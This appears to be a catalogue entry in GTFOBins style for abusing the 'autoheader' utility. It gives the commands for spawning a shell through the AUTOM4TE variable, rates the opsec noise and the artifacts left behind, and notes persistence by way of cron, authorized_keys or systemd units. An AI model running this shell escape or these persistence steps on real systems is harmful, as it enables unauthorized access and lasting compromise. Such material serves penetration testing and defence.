---
name: autoheader
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '/bin/sh 1>&0' >/path/to/temp-file
    chmod +x /path/to/temp-file
    touch configure.ac
    AUTOM4TE=/path/to/temp-file autoheader
references:
- https://gtfobins.github.io/gtfobins/autoheader/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
